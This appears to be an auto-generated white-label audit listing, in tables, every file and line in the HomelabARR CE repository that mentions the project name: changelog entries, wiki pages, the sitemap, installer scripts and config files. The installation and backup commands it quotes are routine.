| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-281: cli-bridge — stop process.env pollution + deployStandard hardening by @smashingtags in #340` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-282: audit/log/alert/db hardening (redaction drift, SQLCipher, alert) by @smashingtags in #339` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-283: mandatory CSRF token + route hardening (health path, dockerode stats) by @smashingtags in #341` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-284: track Docker/SSE timers, fix health lie, lock down SSE CORS + subscribe auth by @smashingtags in #343` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-285: harden auth routes — cli-mint jti-less+ttl, constant-time validatePassword, MFA invariant pins by @smashin` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-286: CHANGELOG for audit anchor + deploy-catch cleanup by @smashingtags in #348` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-287: document AUDIT_ANCHOR_KEY + out-of-band audit anchor by @smashingtags in #349` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-287: out-of-band HMAC-signed audit chain-tip anchor by @smashingtags in #346` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-288: deploy.js outer catch is unreachable — trim dead branches + pin parser boundary by @smashingtags in #345` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-290: fix undici patch — pack-and-replace npm's bundled copy by @smashingtags in #367` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-290: patch npm-bundled undici (CVE-2026-12151) in backend image by @smashingtags in #365` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-290: restore Trivy default-branch reporting by @smashingtags in #353` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-291: make log-injection sanitizer CodeQL-recognized by @smashingtags in #355` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-291: resolve open code-scanning alerts by @smashingtags in #354` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-293: restore dual-registry auto-publish (Docker Hub regression fix) by @smashingtags in #368` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-295: smoke E2E reuses one session (fix 15-min rate-limit cascade) by @smashingtags in #369` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-296: bump backend base + weekly no-cache rebuild (fix stale docker-cli CVE) by @smashingtags in #370` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-300: ignore typescript >=6.1.0 in dependabot dev-tools group by @smashingtags in #387` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-302: resolve 4 open security alerts by @smashingtags in #418` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-304: remove npm from the backend image instead of patching its deps by @smashingtags in #438` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-305: consolidate four lock bumps and pin node to major 24 by @smashingtags in #437` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-306: guard the native build and give the E2E lane real diagnostics by @smashingtags in #446` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-307: bucket IPv6 login attempts by subnet instead of exact address by @smashingtags in #477` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-308: drop the unused better-sqlite3 dependency by @smashingtags in #454` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-309: release v2.3.0 by @smashingtags in #456` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-312: report the crash before trying to record it by @smashingtags in #479` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-313: alert externally when the demo or dev goes down by @smashingtags in #459` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-313: fall back across webhooks so one dead URL cannot mute alerting by @smashingtags in #462` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-313: strip whitespace from the webhook secret before use by @smashingtags in #461` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-313: surface why a Discord notification failed by @smashingtags in #460` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-315: let the server say it is a demo instead of guessing from the URL by @smashingtags in #485` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-316: make the changelog generator actually categorise this repo's PRs by @smashingtags in #486` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-316: stop the changelog workflow blanking the published wiki page by @smashingtags in #483` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-317: move dev.homelabarr.com to the CE dev app by @smashingtags in #463` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-318: alert when the hypervisor disk fills or a domain pauses by @smashingtags in #466` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-318: check the webhook up front so a missing one is not silent by @smashingtags in #467` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-318: deliver hypervisor alerts by email so they reach someone by @smashingtags in #482` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-320: reset the public demo on a timer so a visitor cannot break it for good by @smashingtags in #471` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-321: add a demo mode that refuses account changes by @smashingtags in #472` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-322: build each architecture on its own runner instead of emulating arm64 by @smashingtags in #473` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-323: create the major-update label instead of assuming it exists by @smashingtags in #481` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-323: merge routine dependency updates without a human touching them by @smashingtags in #474` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-328: restore container log reads through the socket proxy by @smashingtags in #505` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-330: bring docker-build-push onto the artifact actions the rest of the repo uses by @smashingtags in #508` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-330: take Stryker 10, bumping the vitest runner with the core by @smashingtags in #509` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-330: take better-sqlite3-multiple-ciphers 13 by @smashingtags in #510` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-332: cover the audit anchor and get the mutation lane green by @smashingtags in #511` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-333: set the version to 2.5.0 by @smashingtags in #512` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-334: never let a release build reuse a cached package layer by @smashingtags in #514` |
| `wiki/docs/install/changelog.md` | 1 x | `- HLCE-334: set the version to 2.5.1 by @smashingtags in #515` |
| `wiki/docs/install/changelog.md` | 1 x | `- Release dev → main: /auth/me reload fix, E2E on ce-dev, Dependabot unblock by @smashingtags in #248` |
| `wiki/docs/install/changelog.md` | 1 x | `- Release dev → main: HLCE-191 E2E + INFRA-64/70 cleanup by @smashingtags in #243` |
| `wiki/docs/install/changelog.md` | 1 x | `- Sync docs to imogenlabs org + current app count by @smashingtags in #495` |
| `wiki/docs/install/changelog.md` | 1 x | `- add White-Label & Forking guide (self-maintaining) by @smashingtags in #152` |
| `wiki/docs/install/changelog.md` | 1 x | `- auto-build :dev on dev pushes (ce-dev auto-deploy) by @smashingtags in #249` |
| `wiki/docs/install/changelog.md` | 1 x | `- bump Playwright workers from 1 to 4 by @smashingtags in #157` |
| `wiki/docs/install/changelog.md` | 1 x | `- fix broken README mascot image by @smashingtags in #163` |
| `wiki/docs/install/changelog.md` | 1 x | `- flatten nav + move Discord/Discussions to header icons by @smashingtags in #160` |
| `wiki/docs/install/changelog.md` | 1 x | `- harden users.json loader + DialogDescription a11y by @smashingtags in #165` |
| `wiki/docs/install/changelog.md` | 1 x | `- optimize app icons (PNG → WebP, 5.9MB → 1.2MB) by @smashingtags in #154` |
| `wiki/docs/install/changelog.md` | 1 x | `- refresh CE UI screenshots (dark + light) by @smashingtags in #161` |
| `wiki/docs/install/changelog.md` | 1 x | `- remove Pro Edition section + Author → Developer by @smashingtags in #155` |
| `wiki/docs/install/changelog.md` | 1 x | `- remove stale octopus favicons by @smashingtags in #153` |
| `wiki/docs/install/changelog.md` | 1 x | `- remove stale tracked files by @smashingtags in #150` |
| `wiki/docs/install/changelog.md` | 1 x | `- remove unused react-query, bump shadcn (kills all npm deprecation warnings) by @smashingtags in #158` |
| `wiki/docs/install/changelog.md` | 1 x | `- swap octopus for new HomelabARR mascot (placeholder) by @smashingtags in #151` |
| `wiki/docs/install/changelog.md` | 1 x | `- whitelabel-audit workflow opens PR instead of direct push by @smashingtags in #156` |
| `wiki/docs/robots.txt` | 1 x | `# wiki.homelabarr.com — documentation for HomelabARR Community Edition.` |
| `wiki/docs/robots.txt` | 1 x | `Sitemap: https://wiki.homelabarr.com/sitemap.xml` |
| `wiki/mkdocs.yml` | 1 x | `      link: https://discord.gg/Pc7mXX786x` |
| `wiki/mkdocs.yml` | 1 x | `      link: https://github.com/imogenlabs/homelabarr-ce` |
| `wiki/mkdocs.yml` | 1 x | `      link: https://github.com/imogenlabs/homelabarr-ce/discussions` |
| `wiki/mkdocs.yml` | 1 x | `      link: https://homelabarr.com` |
| `wiki/mkdocs.yml` | 1 x | `edit_uri: https://github.com/imogenlabs/homelabarr-ce/edit/main/wiki/docs/` |
| `wiki/mkdocs.yml` | 1 x | `repo_url: https://github.com/imogenlabs/homelabarr-ce` |
| `wiki/mkdocs.yml` | 1 x | `site_url: "https://wiki.homelabarr.com"` |
| `wiki/site/404.html` | 1 x | `  </style><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googl` |
| `wiki/site/CNAME` | 1 x | `wiki.homelabarr.com` |
| `wiki/site/guides/_white-label-audit/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/_white-label-audit/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/api-reference/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/api-reference/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/api-reference/index.html` | 1 x | `</code></pre></div> <p>Common codes: <code>400</code> bad request, <code>401</code> not authenticated, <code>403</code> ` |
| `wiki/site/guides/architecture/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/architecture/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/architecture/index.html` | 1 x | `</code></pre></div> <p>When code merges to <code>main</code>, GitHub Actions: 1. Builds multi-arch Docker images (amd64 ` |
| `wiki/site/guides/architecture/index.html` | 1 x | `homelabarr-data/        # Docker volume — HomelabARR settings (users, sessions)` |
| `wiki/site/guides/cli-bridge/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/cli-bridge/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/cli-bridge/index.html` | 1 x | `</code></pre></div> <h3 id=available-variables>Available Variables<a class=headerlink href=#available-variables title="P` |
| `wiki/site/guides/cli-installation/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/cli-installation/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/cli-installation/index.html` | 1 x | `</code></pre></div> <div class="admonition info"> <p class=admonition-title>What this script does</p> <p>You can <a href` |
| `wiki/site/guides/cli-installation/index.html` | 1 x | `</code></pre></div> <p>Open <code>http://YOUR-SERVER-IP:8084</code> — any containers you deployed via CLI will already` |
| `wiki/site/guides/cli-installation/index.html` | 1 x | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/configuration/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/configuration/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/configuration/index.html` | 1 x | `</code></pre></div> </div> <p>Start HomelabARR with your .env file:</p> <div class=highlight><pre><span></span><code>doc` |
| `wiki/site/guides/configuration/index.html` | 1 x | `</code></pre></div> <p>Each app gets its own folder. <strong>This is what you back up.</strong></p> <p><strong>HomelabAR` |
| `wiki/site/guides/configuration/index.html` | 1 x | `</code></pre></div> <p>See the <a href=../traefik-setup/ >Traefik &amp; Domain Setup</a> guide for the full walkthrough.` |
| `wiki/site/guides/contributing/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/contributing/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/contributing/index.html` | 1 x | `</code></pre></div><p></p> </li> <li> <p><strong>Submit Pull Request</strong></p> </li> <li>Use descriptive title</li> <` |
| `wiki/site/guides/contributing/index.html` | 1 x | `<span class=nb>cd</span><span class=w> </span>homelabarr-ce` |
| `wiki/site/guides/contributing/index.html` | 1 x | `git<span class=w> </span>clone<span class=w> </span>https://github.com/YOUR_USERNAME/homelabarr-ce.git` |
| `wiki/site/guides/contributing/index.html` | 1 x | `git<span class=w> </span>remote<span class=w> </span>add<span class=w> </span>upstream<span class=w> </span>https://gith` |
| `wiki/site/guides/faq/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/faq/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/faq/index.html` | 1 x | `</code></pre></div> <h3 id=how-do-i-update-to-the-latest-version>How do I update to the latest version?<a class=headerli` |
| `wiki/site/guides/faq/index.html` | 1 x | `</code></pre></div> <hr> <h2 id=security>Security<a class=headerlink href=#security title="Permanent link">¶</a></h2> <` |
| `wiki/site/guides/faq/index.html` | 1 x | `</code></pre></div> <p>Refresh the dashboard and your app shows up in <strong>My Apps</strong>. See <a href=../cli-bridg` |
| `wiki/site/guides/faq/index.html` | 3 x | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/history/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/history/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/migration/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/migration/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/migration/index.html` | 1 x | `</code></pre></div> <div class="admonition tip"> <p class=admonition-title>Keep your rclone config</p> <p>Even if you mo` |
| `wiki/site/guides/migration/index.html` | 1 x | `</code></pre></div> <p>Verify the backup completed before continuing: </p><div class=highlight><pre><span></span><code>l` |
| `wiki/site/guides/migration/index.html` | 1 x | `</code></pre></div><p></p> </div> <hr> <h2 id=step-1-install-homelabarr-ce>Step 1: Install HomelabARR CE<a class=headerl` |
| `wiki/site/guides/migration/index.html` | 1 x | `<span class=nb>cd</span><span class=w> </span>/opt/homelabarr` |
| `wiki/site/guides/migration/index.html` | 1 x | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/migration/index.html` | 1 x | `git<span class=w> </span>clone<span class=w> </span>https://github.com/imogenlabs/homelabarr-ce.git<span class=w> </span` |
| `wiki/site/guides/migration/index.html` | 1 x | `sudo<span class=w> </span>tar<span class=w> </span>czf<span class=w> </span>/opt/homelabarr-backup-<span class=k>$(</spa` |
| `wiki/site/guides/mobile-app/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/mobile-app/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `</code></pre></div> <div class="admonition info"> <p class=admonition-title>What this script does</p> <p>You can <a href` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `</code></pre></div> <div class="admonition warning"> <p class=admonition-title>Replace YOUR-SERVER-IP — both times</p>` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `</code></pre></div> <p>If both commands print a version number, you're good. If not, check the <a href=https://docs.dock` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `</code></pre></div> <p>Replace <code>YOUR-VMID</code> with your container's ID number (like <code>100</code> or <code>99` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `</code></pre></div> <p>This downloads the entire repo — including all 100+ app templates — to <code>/opt/homelabarr<` |
| `wiki/site/guides/quick-start/index.html` | 1 x | `</code></pre></div> <p>You should see the HomelabARR dashboard with 100+ apps ready to deploy.</p> <h3 id=step-6-log-in-` |
| `wiki/site/guides/quick-start/index.html` | 2 x | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/traefik-setup/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/traefik-setup/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/traefik-setup/index.html` | 1 x | `</code></pre></div> <p>The key piece is the <code>chain-authelia</code> middleware definition. HomelabARR's <strong>Trae` |
| `wiki/site/guides/traefik-setup/index.html` | 1 x | `</code></pre></div> <p>to the container's labels. No manual config per app — HomelabARR handles it.</p> <hr> <h2 id=cf` |
| `wiki/site/guides/web-dashboard/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/web-dashboard/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/web-dashboard/index.html` | 1 x | `</code></pre></div> <p>Refresh the dashboard — your app shows up in the <strong>My Apps</strong> tab. You can use the ` |
| `wiki/site/guides/white-label/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/white-label/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/white-label/index.html` | 1 x | `</code></pre></div> <hr> <h2 id=building-your-own-container-images>Building your own container images<a class=headerlink` |
| `wiki/site/guides/white-label/index.html` | 1 x | `</code></pre></div> <p>The final grep should mostly return hits in <code>wiki/docs/guides/history.md</code>, <code>LICEN` |
| `wiki/site/guides/white-label/index.html` | 1 x | `<span class=nv>OLD_DOMAIN</span><span class=o>=</span><span class=s2>"homelabarr.com"</span>` |
| `wiki/site/guides/white-label/index.html` | 1 x | `<span class=nv>OLD_NAME</span><span class=o>=</span><span class=s2>"homelabarr"</span><span class=w>         </span><spa` |
| `wiki/site/guides/white-label/index.html` | 1 x | `<span class=nv>OLD_REPO</span><span class=o>=</span><span class=s2>"smashingtags/homelabarr-ce"</span>` |
| `wiki/site/guides/white-label/index.html` | 1 x | `<span class=nv>OLD_WIKI</span><span class=o>=</span><span class=s2>"wiki.homelabarr.com"</span>` |
| `wiki/site/guides/white-label/index.html` | 1 x | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/white-label/index.html` | 1 x | `grep<span class=w> </span>-ri<span class=w> </span><span class=s2>"homelabarr"</span><span class=w> </span>--exclude-dir` |
| `wiki/site/guides/white-label/index.html` | 1 x | `grep<span class=w> </span>-ri<span class=w> </span><span class=s2>"homelabarr"</span><span class=w> </span>dist/<span cl` |
| `wiki/site/img/diagrams/generate_diagrams.py` | 1 x | `    ax.text(0.17, 0.115, 'homelabarr-data', fontsize=8,` |
| `wiki/site/img/diagrams/generate_diagrams.py` | 1 x | `    ax.text(0.5, 0.97, 'HOMELABARR CE  --  SYSTEM ARCHITECTURE',` |
| `wiki/site/img/diagrams/generate_diagrams.py` | 1 x | `    ax.text(0.99, 0.015, 'homelabarr.com  \|  Imogen Labs',` |
| `wiki/site/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/index.html` | 1 x | `</code></pre></div> <p>Open <strong>http://YOUR-SERVER-IP:8084</strong> and log in with <code>admin</code> / <code>admin` |
| `wiki/site/index.html` | 1 x | `<span class=nb>cd</span><span class=w> </span>/opt/homelabarr` |
| `wiki/site/index.html` | 1 x | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/index.html` | 1 x | `git<span class=w> </span>clone<span class=w> </span>https://github.com/imogenlabs/homelabarr-ce.git<span class=w> </span` |
| `wiki/site/install/changelog/index.html` | 1 x | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/install/changelog/index.html` | 1 x | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/search/search_index.json` | 1 x | `{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text"` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/_white-label-audit/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/api-reference/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/architecture/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/cli-bridge/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/cli-installation/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/configuration/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/contributing/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/faq/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/history/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/migration/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/mobile-app/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/quick-start/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/traefik-setup/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/web-dashboard/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/guides/white-label/</loc>` |
| `wiki/site/sitemap.xml` | 1 x | `         <loc>https://wiki.homelabarr.com/install/changelog/</loc>` |

## Other

**911 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `.github/CODEOWNERS` | 1 x | `*  @smashingtags` |
| `.github/FUNDING.yml` | 1 x | `ko_fi: homelabarr` |
| `.github/ISSUE_TEMPLATE/bug_report.md` | 1 x | `assignees: 'smashingtags'` |
| `.gitleaks.toml` | 1 x | `id = "homelabarr-admin-password"` |
| `.gitleaks.toml` | 1 x | `id = "homelabarr-jwt-secret"` |
| `.gitleaks.toml` | 1 x | `title = "homelabarr-ce gitleaks config"` |
| `.installer/homelabber` | 1 x | `     $(command -v chown) -cR 1000:1000 ${homelabarr} 1>/dev/null 2>&1` |
| `.installer/homelabber` | 1 x | `     $(command -v rsync) ${homelabarr}/homelabarr-ce/docker.yml $basefolder/$compose -aqhv` |
| `.installer/homelabber` | 1 x | `   $(command -v cd) ${homelabarr} && $(command -v bash) install.sh` |
| `.installer/homelabber` | 1 x | `  appfolder="/opt/homelabarr"` |
| `.installer/homelabber` | 1 x | `  cd /opt/homelabarr/` |
| `.installer/homelabber` | 1 x | `  find /opt/homelabarr-cli/apps/ -type f -name '*${APP}*' -exec cp "{}" $basefolder/$compose \;` |
| `.installer/homelabber` | 1 x | `# Visit homelabarr.com               #` |
| `.installer/homelabber` | 1 x | `envmigrate="$homelabarr/apps/.subactions/envmigrate.sh"` |
| `.installer/homelabber` | 1 x | `homelabarr="/opt/homelabarr-cli"` |
| `.installer/homelabber` | 2 x | `homelabarr=/opt/homelabarr` |
| `.installer/homelabber` | 1 x | `if [[ -d ${homelabarr} ]];then` |
| `.installer/ubuntu.sh` | 1 x | `      cd /opt/homelabarr/${LOCATION} && $(command -v bash) install.sh` |
| `.installer/ubuntu.sh` | 1 x | `   # Support both traditional /opt/homelabarr and current directory` |
| `.installer/ubuntu.sh` | 1 x | `   if [[ -d "/opt/homelabarr/${LOCATION}" ]]; then` |
| `.installer/ubuntu.sh` | 1 x | `# Docker Maintainer smashingtags    #` |
| `.installer/ubuntu.sh` | 1 x | `file=/opt/homelabarr/.installer/homelabber` |
| `.installer/ubuntu.sh` | 1 x | `if [[ -f "/bin/homelabarr-cli" ]];then` |
| `.installer/ubuntu.sh` | 1 x | `store2=/usr/bin/homelabarr-cli` |
| `.installer/ubuntu.sh` | 1 x | `store=/bin/homelabarr-cli` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/.*` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/\.well-known/.*` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/assets/.*` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/favicon\.svg` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/fonts/.*` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/icons/.*` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/robots\.txt` |
| `.zap/scan-config.yml` | 1 x | `    - https://dev.homelabarr.com/sitemap\.xml` |
| `.zap/scan-config.yml` | 1 x | `    loginUrl: https://dev.homelabarr.com/api/auth/login` |
| `.zap/scan-config.yml` | 1 x | `  name: homelabarr-ce` |
| `Makefile` | 1 x | `encrypt-db:      ; docker compose exec backend bash scripts/encrypt-db.sh /app/data/homelabarr.db /run/secrets/sqlcipher` |
| `apps/.installer/ubuntu.sh` | 1 x | `     buildapp=$(ls -1p /opt/homelabarr/apps/${section}/ \| $(command -v sed) -e 's/.yml//g' \| grep -x $typed)` |
| `apps/.installer/ubuntu.sh` | 1 x | `     checksection=$(ls -1p /opt/homelabarr/apps/ \| grep '/$' \| $(command -v sed) 's/\/$//' \| grep -x $section)` |
| `apps/.installer/ubuntu.sh` | 3 x | `   appfolder=/opt/homelabarr/apps/` |
| `apps/.installer/ubuntu.sh` | 2 x | `  --exclude-from=/opt/homelabarr/apps/.backup/backup_excludes \` |
| `apps/.installer/ubuntu.sh` | 1 x | `  appfolder="/opt/homelabarr/apps"` |
| `apps/.installer/ubuntu.sh` | 1 x | `# Docker Maintainer homelabarr      #` |
| `apps/.installer/ubuntu.sh` | 1 x | `# Docker owned homelabarr           #` |
| `apps/.installer/ubuntu.sh` | 1 x | `appfolder="/opt/homelabarr/apps"` |
| `apps/.installer/ubuntu.sh` | 1 x | `buildshow=$(ls -1p /opt/homelabarr/apps/ \| grep '/$' \| $(command -v sed) 's/\/$//')` |
| `apps/.installer/ubuntu.sh` | 1 x | `buildshow=$(ls -1p /opt/homelabarr/apps/${section}/ \| sed -e 's/.yml//g' )` |
| `apps/downloads/nzbget.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:nzbget\|ghcr.io/imogenlabs/homelabarr-mod-nzbget:v1.0.0"` |
| `apps/downloads/qbittorrent.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:qbittorrent\|ghcr.io/imogenlabs/homelabarr-mod-qbittorrent:v1.0.0"` |
